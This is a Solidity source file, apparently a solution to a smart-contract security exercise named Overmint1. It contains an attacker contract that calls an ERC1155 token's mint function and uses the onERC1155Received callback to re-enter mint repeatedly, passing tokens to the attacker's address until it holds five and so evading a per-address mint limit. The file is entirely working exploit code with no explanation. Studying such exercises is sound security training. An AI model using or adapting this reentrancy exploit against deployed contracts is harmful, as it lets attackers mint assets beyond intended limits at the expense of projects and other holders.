// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

interface IERC1155Mintable {
    function balanceOf(address account, uint256 id) external view returns (uint256);

    // ----------- State changing Api -----------

    function mint(uint256 id, bytes calldata data) external;

    function setApprovalForAll(address operator, bool approved) external;

    function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes memory data) external;
}

contract Overmint1_ERC1155Attacker {
    IERC1155Mintable erc1155;
    address attacker;
    // uint256 id;

    constructor(address _erc1155) 
    // uint256 _id
    {
        erc1155 = IERC1155Mintable(_erc1155);
        // id = _id;
    }

    function attack(uint256 _id) external {
        attacker = msg.sender;
        erc1155.mint(_id, new bytes(0));
    }

    function onERC1155Received(address, address, uint256 id, uint256, bytes calldata) external returns (bytes4) {
        if (erc1155.balanceOf(attacker, id) < 5) {
            erc1155.safeTransferFrom(address(this), attacker, id, 1, new bytes(0));
            erc1155.mint(id, new bytes(0));

            if (erc1155.balanceOf(attacker, id) == 5) return this.onERC1155Received.selector;
        }
        return this.onERC1155Received.selector;
    }
}
